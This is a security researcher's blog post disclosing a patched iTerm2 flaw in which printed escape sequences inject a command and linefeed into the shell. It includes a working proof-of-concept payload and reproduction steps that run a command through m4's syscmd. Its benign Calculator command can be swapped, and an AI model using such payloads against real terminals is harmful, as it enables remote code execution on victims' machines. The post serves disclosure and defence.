<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>From Terminal Output to Arbitrary Remote Code Execution | solid-snail blog</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="From Terminal Output to Arbitrary Remote Code Execution" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="It was the year of the Linux desktop 1978. Old yellowed computers were not yet old, nor yellowed. Digital Equipment Corporation released the first popular terminal to support a standardized in-band encoding for control functions, the VT100." />
<meta property="og:description" content="It was the year of the Linux desktop 1978. Old yellowed computers were not yet old, nor yellowed. Digital Equipment Corporation released the first popular terminal to support a standardized in-band encoding for control functions, the VT100." />
<link rel="canonical" href="https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce" />
<meta property="og:url" content="https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce" />
<meta property="og:site_name" content="solid-snail blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-08-28T22:50:01+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="From Terminal Output to Arbitrary Remote Code Execution" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-28T22:50:01+00:00","datePublished":"2023-08-28T22:50:01+00:00","description":"It was the year of the Linux desktop 1978. Old yellowed computers were not yet old, nor yellowed. Digital Equipment Corporation released the first popular terminal to support a standardized in-band encoding for control functions, the VT100.","headline":"From Terminal Output to Arbitrary Remote Code Execution","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce"},"url":"https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://blog.solidsnail.com/feed.xml" title="solid-snail | blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">solid-snail | blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/donate/">Donate</a><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">From Terminal Output to Arbitrary Remote Code Execution</h1>
    <p class="post-meta"><time class="dt-published" datetime="2023-08-28T22:50:01+00:00" itemprop="datePublished">
        Aug 28, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>It was the year of the Linux desktop 1978.
Old yellowed computers were not yet old, nor yellowed.
Digital Equipment Corporation released the first popular terminal to support 
a standardized in-band encoding for control functions, the VT100.</p>

<p>Little did they know, that almost half a century later,
it will still be the defacto standard for all terminal emulators,
essential to the workflow of anyone who programs professionally in any capacity.</p>

<p>Very cool <a href="https://github.com/solid-snail">@solid-snail</a>,
but what does that have to do with Remote Code Execution?</p>

<p>Well, recall me saying in-band encoding?
It means that when a program wants to relay a message to the terminal
it embeds it in the output,
and perhaps more importantly,
when the terminal wants to relay a message to the program
it embeds it in the input.
Yes, the user input.</p>

<blockquote>
  <p><strong>update:</strong> there are now two CVEs for the vulnerabilities.
<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46300">CVE-2023-46300</a>
and <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46301">CVE-2023-46301</a>.</p>
</blockquote>

<h2 id="whats-the-plan">What’s the Plan?</h2>

<p>Attack plan is simple.<br />
A program prints non-sanitized, non-trusted content.<br />
The content will contain our exploit.<br />
The exploit will elicit a response that contains a shell command, and a linefeed.<br />
The program, that was not expecting any further input,
will leave it waiting in stdin.<br />
After it finished executing, the shell will kick back in,
at which point our command will be read and executed.</p>

<p>Now, you might be wondering…
Is it really that simple? How come it isn’t abused routinely?
Why would that be supported <em>at all</em> by <em>any</em> terminal?
Did no one see it coming?
Do I really not have anything better to do with my time?
I will address almost all of these.</p>

<p>I also plan release a proper repo,
with the full source code,
and perhaps some demos.
It will be linked here when available.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p><a href="https://github.com/gnachman">@gnachman</a>,
who was probably fed up with being <a href="https://www.theverge.com/22967776/apple-magic-mouse-charging-port-bottom-upside-down-its-2022">bottom charged</a> by Apple,
created a terminal emulator named iTerm2.
iTerm2 implements many features
beyond the standard experience of a terminal emulator.
Some are implemented using non-standard escape sequences.
This is an escape sequence: <code class="language-plaintext highlighter-rouge">\x1b[32m</code>.
It changes the color of text.
You can try it out with the <code class="language-plaintext highlighter-rouge">printf</code> command, <code class="language-plaintext highlighter-rouge">printf '\x1b[32mtext'</code></p>

<p>Two of such features, are of interest to us.</p>

<ul>
  <li>Tmux integration</li>
  <li>Request upload</li>
</ul>

<p>I won’t get into the details of what those features do,
because it doesn’t matter to us.
It is a specific implementation detail that we’re after.
They both inject a linefeed to stdin.</p>

<p>We got the terminal to press enter in the name of the user,
now what?</p>

<h2 id="exploit">Exploit</h2>

<p>Two exploits I came up with!
One requires the attacker to deliver an executable to the victim’s machine,
and works with bash but not zsh.
The other, which I’m more proud of,
requires only for the command’s output to be somewhat repeatable,
and works with zsh but not bash.</p>

<p>Terminal developers aren’t so excited
about the idea of us running surprise commands for their users,
as it turns out,
and left very little for us to work with.
We are limited in what we can inject to stdin.</p>

<p>I could say I managed to run <code class="language-plaintext highlighter-rouge">ln</code> with no arguments
and call it a day,
but that would be boring!</p>

<p>We can’t place the command we want to run directly in stdin.
That means we need to find another place for it.<br />
A file? Could we run it?<br />
If we could specify it as an argument of a command
we wouldn’t be dealing with a file right now.
We also can’t specify just a file’s name as the command.
The shell will interpret it as a name of a command
and not a path to an executable.</p>

<p>The solution is obvious. Ask the terminal to report a color!</p>

<p>The response to a query about a color value will contain slashes,
which will cause the shell to interpret it as a path,
not a command.</p>

<p>Lets try.
When we <code class="language-plaintext highlighter-rouge">printf '\x1b]4;0;#000\007\x1b]4;0;?\007'</code>,
we can see that our shell’s command line now contains
<code class="language-plaintext highlighter-rouge">4;0;rgb:0000/0000/0000</code>.
If executed, it will attempt to run a file at <code class="language-plaintext highlighter-rouge">rgb:0000/0000/0000</code>.</p>

<p>But to be honest, files… files are annoying.<br />
How am <em>I</em> going to deliver one all the way to <em>your</em> machine?!<br />
We need yet another place for the code.</p>

<p>I’ll stop teasing, the place is the output itself, and this is the exploit:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syscmd(open -a Calculator) \x1b[5n \x1bP$q$|\x1b\\ \x1b[#| \x1b[14H \x1b[6n \x1bP1000p%session-changed $9 s\n
</code></pre></div></div>

<p>To reproduce (tested it on iTerm2 3.5.0beta10):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alias newcmd='echo -e '\''syscmd(open -a Calculator) \x1b[5n \x1bP$q$|\x1b\\ \x1b[#| \x1b[14H \x1b[6n \x1bP1000p%session-changed $9 s\n'\'
newcmd arg
</code></pre></div></div>

<p>Lets break down this mess.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">syscmd(open -a Calculator)</code> -
as of now, does absolutely nothing, besides being printed out.</li>
  <li><code class="language-plaintext highlighter-rouge">\x1b[5n</code> -
Device Status Report (DSR) -
pushes <code class="language-plaintext highlighter-rouge">\x1b[0n</code> to stdin.
Results in <code class="language-plaintext highlighter-rouge">n</code> in the command line.</li>
  <li><code class="language-plaintext highlighter-rouge">\x1bP$q$|\x1b\\</code> - Request Status String (DECRQSS) -
pushes <code class="language-plaintext highlighter-rouge">\x1bP1$r{alpha-numeric stuff}$|\x1b\\</code> to stdin.</li>
  <li><code class="language-plaintext highlighter-rouge">\x1b[#|</code> - Report selected graphic rendition (XTREPORTSGR) -
pushes <code class="language-plaintext highlighter-rouge">\x1b[{0 or nothing by default}m</code> to stdin.
Results in <code class="language-plaintext highlighter-rouge">m</code> being added to the command line.</li>
  <li><code class="language-plaintext highlighter-rouge">\x1b[14H</code> - Cursor Position (CUP) -
moves the cursor to row 14 (of the terminal, not the shell).</li>
  <li><code class="language-plaintext highlighter-rouge">\x1b[6n</code> - Device Status Report (DSR) -
pushes <code class="language-plaintext highlighter-rouge">\x1b[14;{cursor column}R</code>.
Results in <code class="language-plaintext highlighter-rouge">4;{cursor column}R</code> being added to the command line.</li>
  <li><code class="language-plaintext highlighter-rouge">\x1bP1000p</code> - Tmux integration -
indicates that tmux has started in control mode.</li>
  <li><code class="language-plaintext highlighter-rouge">%session-changed $9 s\n</code> - imitates output of tmux in control mode.
Needed for more consistent and predictable results.</li>
</ul>

<p>I know that by now it might seem obvious to most of you,
but no one likes being the one that raises their hand,
so I’ll explain it further.</p>

<p><code class="language-plaintext highlighter-rouge">syscmd(open -a Calculator)</code>  is our <a href="https://en.wikipedia.org/wiki/Chekhov%27s_gun">Chechov’s gun</a>.</p>

<p>Now, to understand why not all characters pushed to stdin
end up in the shell’s command line,
you have to understand another use for escape sequences -
special keys and key combos.
There’s no character code for <code class="language-plaintext highlighter-rouge">PgUp</code>.
There’s no ASCII code for <code class="language-plaintext highlighter-rouge">Shift+F1</code>.
When you headbutt the keyboard
after trying to figure out why Ubuntu is hell-bent
on removing its own desktop environment on the next full-upgrade,
those are expressed by the terminal as escape sequences.
That is why most of the sequences pushed to stdin in this exploit
are partially swallowed by the shell -
they can also represent (sometimes invalid) key presses.</p>

<p><code class="language-plaintext highlighter-rouge">\x1b[5n</code>. Why do we want <code class="language-plaintext highlighter-rouge">n</code> in the command line?
Put a pin in that,
but it has to do with the fact that we knew the exploited command starts with an <code class="language-plaintext highlighter-rouge">n</code>
(our alias <code class="language-plaintext highlighter-rouge">newcmd</code> in this case).</p>

<p>The response to <code class="language-plaintext highlighter-rouge">\x1bP$q$|\x1b\\</code> is <code class="language-plaintext highlighter-rouge">\x1bP1$r{alpha-numeric stuff}$|\x1b\\</code>.
This time we want to pay attention to how the shell interprets the sequence.
<code class="language-plaintext highlighter-rouge">\x1bP</code> is equivalent to <code class="language-plaintext highlighter-rouge">alt+P</code>.
You can actually test that easily.
Open a terminal, press the <code class="language-plaintext highlighter-rouge">Esc</code> key, release it, then press <code class="language-plaintext highlighter-rouge">P</code>.
In zsh it will lookup a command from the command history
based on the first word in the current command line,
if there is one,
and load it.
In our case it will be <code class="language-plaintext highlighter-rouge">newcmd arg</code>.
The rest of the response is appended to it,
so: <code class="language-plaintext highlighter-rouge">newcmd arg1$r{alpha-numeric stuff}$|</code>.</p>

<p><code class="language-plaintext highlighter-rouge">\x1b[#|</code> will add <code class="language-plaintext highlighter-rouge">m</code> to our command line:
<code class="language-plaintext highlighter-rouge">newcmd arg1$r{alpha-numeric stuff}$|m</code>.</p>

<p><code class="language-plaintext highlighter-rouge">\x1b[14H</code> sets the terminal’s cursor to line 14.
<code class="language-plaintext highlighter-rouge">\x1b[6n</code> is a request for cursor coordinates.
The line position will be 14 as we set it,
and the response will be:
<code class="language-plaintext highlighter-rouge">\x1b[14;{cursor column}R</code>.
<code class="language-plaintext highlighter-rouge">\x1b[1</code> is swallowed by the shell,
so our current command line is now:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>newcmd arg1$r{alpha-numeric stuff}$|m4;{cursor column}R
</code></pre></div></div>

<p>Before we blow our final punches,
lets take moment to appreciate what’s going on.
<code class="language-plaintext highlighter-rouge">$r{alpha-numeric stuff}$</code> will be discarded by the shell
as an undefined environment variable and a <code class="language-plaintext highlighter-rouge">$</code> without any variable specified.
Anything after the <code class="language-plaintext highlighter-rouge">;</code> is irrelevant to us.
Our current <em>effective</em> command is <code class="language-plaintext highlighter-rouge">newcmd arg1|m4</code>.</p>

<p><code class="language-plaintext highlighter-rouge">m4</code> is a command built-in to macOS, for some reason.
In case you’re not familiar with it, it is a macro engine.
It is basically a c/c++ compiler without the compiler.</p>

<p>This is where our Chechov’s gun makes its appearance again.
<code class="language-plaintext highlighter-rouge">m4</code> has a built-in macro for running commands in the system’s shell.
By piping the output to <code class="language-plaintext highlighter-rouge">m4</code> we’re able to utilize it.</p>

<p>Finally, <code class="language-plaintext highlighter-rouge">\x1bP1000p%session-changed $9 s\n</code> runs the command for us
by pushing a linefeed to stdin.
Not only that, it pushes multiple linefeeds,
each preceded by a tmux command.</p>

<p>Having said that, I can finally return to our pinned question.
We needed the command line
to start with the same letter as the exploited command,
because at times the exploit would fail
due to the shell processing some of the tmux commands
before traversing back in the command history.
I didn’t investigate the cause of that,
but I could easily mitigate it
by filtering the command history in this manner.</p>

<h2 id="thoughts">Thoughts</h2>

<p>As it turns out, I wasn’t the first to come up with this concept.
Security concerns regarding this matter have existed for decades now.
In fact, CVEs regarding this matter have been coming up for as late as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33477">2021</a>
by major terminal emulators.</p>

<p>However, as far as I can tell,
my method of exploitation is novel,
as it didn’t rely on the ability to push arbitrary commands to stdin,
or deliver additional resources to the victim, such as files.
It is self contained.</p>

<p>You might think to yourself,
<em>“Easy! Just don’t inject linefeeds and arbitrary data to stdin,
and you should be good.”</em>.
You would have a point, and most terminals do exactly that,
but you won’t be addressing the root cause.
This solutions assumes the use of a POSIX shell.
What if it’s exploited in the context of a program such as Vim?
It’s easy to see how real damage can be done without the use of a linefeed.</p>

<p>The reason vulnerabilities of this kind keep appearing
is that there is a fundamental problem in the way terminals work.
Embedding commands in that manner is as egregious
as using string concatenation to create sql queries.
We didn’t even touch on the fact that, given the opportunity,
an attacker can use escape sequences
to arbitrarily change the entire display of the terminal.</p>

<p>The standards that define those mechanisms originate in the 70s, <em>the 70s!</em>
The modern environment in which terminal emulators are used today
could not have been predicted at the time.</p>

<p>Its legacy status means that virtually any tool you use from the terminal
already supports it.</p>

<p>Moreover, those vulnerabilities are logical
and inherent to the standard itself.
They can’t be patched in-place in the same manner you would a buffer overflow,
without breaking compatibility.</p>

<p>So what are we to do?</p>

<h3 id="solutions">Solutions</h3>

<p>One solution would be to have all tools used in the terminal sanitize non-trusted data.
Good luck with that.</p>

<p>To fix the fundamental problem,
you would probably need to break compatibility, which would suck.
Suddenly you do not have colored text,
you do not have progress bars,
you do not have fancy interfaces,
you do not pass go,
do not collect $200.
Developers will need to explicitly support that new alternative.</p>

<p>But even if we could assure good adoption rate,
the biggest hurdle, ironically,
will probably be restriction of feature support.
Restrictions made by the terminal meant that:</p>
<ul>
  <li>Interfaces had to primarily be text based, and minimal.</li>
  <li>Keyboard as first class citizen.</li>
  <li>Supporting scriptability was incentivised.
As a result, it is easy to convert day to day workflows to automation.</li>
  <li>Easy cross compatibility when it comes to user interface.</li>
  <li>Easy to support.
If your program supports stdin and stdout, it can support the terminal.
Regardless of hardware, OS, programming language, or framework.</li>
  <li><strong>Stability!</strong> You don’t have to worry about future support as much.
When support is a moving target you find yourself in a situation
like folding displays.
Of course this is a double edged sword, like we’re seeing in this article.</li>
</ul>

<p>When looking at the current landscape of software development,
I find it difficult to have the confidence
that developers possess the restraint required to uphold those standards.
Even when looking at tools aimed at <em>highly technical people</em>!
Lets take a look at IDA Pro and Radare2 as an example.
Even though IDA Pro has many other redeeming qualities,
It clearly misses the mark at some of these points.
For example, in Radare2 your interactions with the program
can be converted, almost directly, into scripts.
Not the case in IDA Pro.</p>

<p>In fact,
the only example of a gui application that would fit those requirements,
is emacs.
For those interested, an <a href="https://catern.com/posts/terminal_quirks.html">article by Spencer Baugh</a>
about terminal emulators,
that also explores the idea of emacs as a replacement for the terminal.
But even a platform as capable as emacs needed to feature a terminal emulator.
It will not solve the Problem of backwards compatibility.</p>

<h2 id="support-open-source">Support Open Source</h2>

<p><a href="https://github.com/gnachman">@gnachman</a> has handled my report professionally,
and reacted swiftly with a patch.
So despite afflicting Objective-C onto my eyes during this research,
I’d encourage anyone who finds his software useful to express support via a donation:<br />
<a href="https://iterm2.com/donate.html">https://iterm2.com/donate.html</a></p>

<p><em>insert self shilling</em><br />
I myself have more blog posts down the pipeline
on already done research.
I’m also conducting more research,
focusing on open source tools used by tech professionals,
but not exclusively.
I believe it’s crucial to secure our toolchains,
at a time when supply chain attacks are so painful,
especially for projects that rely on community support
and are often overlooked.</p>

<p>And uhm… if you find my research useful,
I too hav- I mean… I also accept- uuuh…</p>

<iframe src="https://github.com/sponsors/solid-snail/card" title="Sponsor solid-snail" max-height="225" width="600" style="border: 0;"></iframe>

<p>
    <script src="https://liberapay.com/solid-snail/widgets/button.js"></script>
    <noscript><a href="https://liberapay.com/solid-snail/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg" /></a></noscript>
</p>

<p>
    <a href="https://www.patreon.com/solid_snail" target="_blank">
        <img src="/assets/img/patreon-wordmark-black.svg" style="max-height: 1em; padding: 1em 2em; background-color: white;" />
    </a>
</p>


  </div><a class="u-url" href="/posts/2023-08-28-iterm2-rce" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="https://blog.solidsnail.com/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p>This is where I post about my findings and projects.</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/solid-snail" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://hackerone.com/solid-snail" target="_blank" title="hackerone">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://bugcrowd.com/solid-snail" target="_blank" title="bugcrowd">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#bugcrowd"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://huntr.dev/users/solid-snail/" target="_blank" title="huntr.dev">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#huntr.dev"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://matrix.to/#/@solidsnail:matrix.org" target="_blank" title="matrix">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#matrix"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://infosec.exchange/@solidsnail" target="_blank" title="mastodon">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#mastodon"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
